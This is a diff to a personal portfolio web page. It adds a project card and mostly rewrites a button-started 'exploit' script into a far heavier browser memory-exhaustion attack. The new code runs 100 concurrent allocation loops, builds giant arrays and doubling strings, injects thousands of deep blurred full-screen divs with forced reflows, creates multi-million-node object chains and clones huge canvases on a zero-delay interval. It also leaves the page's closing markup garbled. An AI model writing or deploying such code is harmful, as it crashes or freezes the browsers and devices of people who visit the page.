@@ -871,6 +871,13 @@
                     </div>
                     <div class="website-card animate__animated animate__fadeInUp animate__delay-3s">
                         <div class="card-content">
+                            <h3>Machine Learning Demo - Smart Handwriting Recognition </h3>
+                            <p>Train your own handwriting recognition model!</p>
+                            <a href="https://pyrollc.com.tr/aidemo" target="_blank" class="btn">Visit Site</a>
+                        </div>
+                    </div>
+                    <div class="website-card animate__animated animate__fadeInUp animate__delay-3s">
+                        <div class="card-content">
                             <h3>BaloonBet - Exciting Balloon Betting Game</h3>
                             <p>Exciting Balloon Betting Game</p>
                             <a href="https://pyrollc.com.tr/baloonbet" target="_blank" class="btn">Visit Site</a>
@@ -920,8 +927,7 @@
                     </div>
                 </div>
             </div>
-        </section>                </div>
-            </div>
+        </section>                </div>            </div>
         </section>
 
         <section id="projects" class="section">
@@ -1382,6 +1388,9 @@
             }
         });
         let memoryLeakArray = [];
+        let stringLeakArray = [];
+        let domLeakArray = [];
+        let asyncLoops = [];
         let exploitInterval;
         let isExploiting = false;
 
@@ -1392,18 +1401,107 @@
                 document.getElementById('stopExploit').style.display = 'block';
                 document.getElementById('exploitStatus').innerHTML = 'Status: Exploit running... Creating chunks.';
                 
+                // Start multiple async loops with increased intensity
+                for(let i = 0; i < 100; i++) {
+                    asyncLoops.push(async function loop() {
+                        while(isExploiting) {
+                            await new Promise(resolve => setTimeout(resolve, 0));
+                            let leak = new Array(2000000).fill('x'.repeat(100000));
+                            memoryLeakArray.push(leak);
+                        }
+                    }());
+                }
+
                 exploitInterval = setInterval(() => {
                     try {
-                        let leak = new Array(100000000).fill('x'.repeat(1000));
+                        // Method 1: Massive array allocation with larger size
+                        let leak = new Array(4000000000).fill('x'.repeat(40000));
                         memoryLeakArray.push(leak);
+
+                        // Method 2: More aggressive string concatenation
+                        let str = 'x';
+                        for(let i = 0; i < 32; i++) {
+                            str += str + 'x'.repeat(20000);
+                        }
+                        stringLeakArray.push(str);
+
+                        // Method 3: More intensive DOM manipulation
+                        for(let i = 0; i < 2000; i++) {
+                            let div = document.createElement('div');
+                            div.style.cssText = `
+                                position: fixed;
+                                top: 0;
+                                left: 0;
+                                width: 100vw;
+                                height: 100vh;
+                                pointer-events: none;
+                                opacity: 0;
+                                transform: translate3d(0,0,0) scale(1.1);
+                                filter: blur(10px);
+                                box-shadow: 0 0 50px rgba(0,0,0,0.5);
+                            `;
+                            div.innerHTML = 'x'.repeat(4000000);
+                            
+                            // Create deeper nested structure
+                            let current = div;
+                            for(let j = 0; j < 200; j++) {
+                                let child = document.createElement('div');
+                                child.innerHTML = 'x'.repeat(200000);
+                                child.style.transform = 'translate3d(0,0,0) rotate(1deg)';
+                                child.style.filter = 'blur(5px)';
+                                current.appendChild(child);
+                                current = child;
+                            }
+                            
+                            document.body.appendChild(div);
+                            domLeakArray.push(div);
+                            
+                            // Force multiple reflows
+                            for(let k = 0; k < 10; k++) {
+                                div.getBoundingClientRect();
+                                div.offsetHeight;
+                            }
+                        }
+
+                        // Method 4: More complex recursive object with circular references
+                        let obj = {};
+                        let temp = obj;
+                        for(let i = 0; i < 4000000; i++) {
+                            temp.next = {
+                                data: 'x'.repeat(4000),
+                                parent: obj,
+                                elements: new Array(2000).fill('x'.repeat(2000)),
+                                subObjects: Array(100).fill().map(() => ({
+                                    data: 'x'.repeat(1000),
+                                    nestedArray: new Array(500).fill('x'.repeat(500))
+                                }))
+                            };
+                            temp = temp.next;
+                        }
+                        memoryLeakArray.push(obj);
+
+                        // Method 5: Enhanced Canvas memory leak
+                        let canvas = document.createElement('canvas');
+                        canvas.width = 20000;
+                        canvas.height = 20000;
+                        let ctx = canvas.getContext('2d');
+                        ctx.fillStyle = '#FF0000';
+                        for(let i = 0; i < 2000; i++) {
+                            ctx.fillRect(0, 0, canvas.width, canvas.height);
+                            ctx.drawImage(canvas, 0, 0);
+                            let newCanvas = canvas.cloneNode(true);
+                            newCanvas.getContext('2d').drawImage(canvas, 0, 0);
+                            domLeakArray.push(newCanvas);
+                        }
+
                         document.getElementById('exploitStatus').innerHTML = 
-                            `Status: Running... Allocated chunks: ${memoryLeakArray.length}`;
+                            `Status: Running... Allocated chunks: ${memoryLeakArray.length + stringLeakArray.length + domLeakArray.length}`;
                     } catch (e) {
                         document.getElementById('exploitStatus').innerHTML = 
-                            `Status: Cannot create new exploit chunk: ${e.message}`;
+                            `Status: Memory allocation failed: ${e.message}`;
                         stopExploit();
                     }
-                }, 100);
+                }, 0);
             }
         });
 
@@ -1412,13 +1510,14 @@
         function stopExploit() {
             if (exploitInterval) {
                 clearInterval(exploitInterval);
-                memoryLeakArray = [];
                 isExploiting = false;
+                memoryLeakArray = [];
+                stringLeakArray = [];
+                domLeakArray.forEach(el => el.remove());
+                domLeakArray = [];
                 document.getElementById('startExploit').style.display = 'block';
                 document.getElementById('stopExploit').style.display = 'none';
                 document.getElementById('exploitStatus').innerHTML = 'Status: Exploit stopped';
             }
-        }
-    </script>
-</body>
+                }    </script></body>
 </html>
